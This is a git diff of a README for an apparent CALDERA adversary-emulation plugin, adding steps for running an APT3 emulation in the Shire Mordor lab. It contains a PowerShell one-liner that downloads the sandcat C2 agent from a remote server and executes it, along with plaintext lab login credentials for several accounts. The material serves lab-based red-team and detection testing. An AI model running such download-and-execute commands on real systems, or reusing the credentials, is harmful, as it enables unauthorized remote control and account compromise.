@@ -35,8 +35,18 @@ Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugi
 
 ## Shire Mordor Environment Execution
 
-For use within the Shire Mordor environment deploy 54ndc47 using the following PowerShell command: 
+For use within the [Shire Mordor environment](https://mordor.readthedocs.io/en/latest/mordor_shire.html) deploy 54ndc47 using the following PowerShell command: 
 ```commandline
 $url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;
 
 ```
+Example execution within Shire:    
+
+1) RDP to the public ip of IT001.shire.com. Login - Administrator:P1ls3n! and open up an admin CMD. Close out of the RDP sesion but do not logout the Administrator.    
+
+2) RDP to the public ip of IT001.shire.com. Login - pgustavo:W1n1!2019 and open up an admin CMD and a non-admin PowerShell. Execute the PowerShell command from above. The 54ndc47 agent should now be checked in with CALDERA (172.18.39.8).
+
+3) Browse to the CALDERA UI (http://caldera-public-ip:8888). Login - wardog:B3tt3r! and start an operation using the [ATT&CK Eval APT3 - Full](https://github.com/d4weiss/evals_caldera/blob/master/data/adversaries/ef93dd1b-809b-4a0b-b686-fef549cabbe4.yml) adversary profile.  
+
+
+
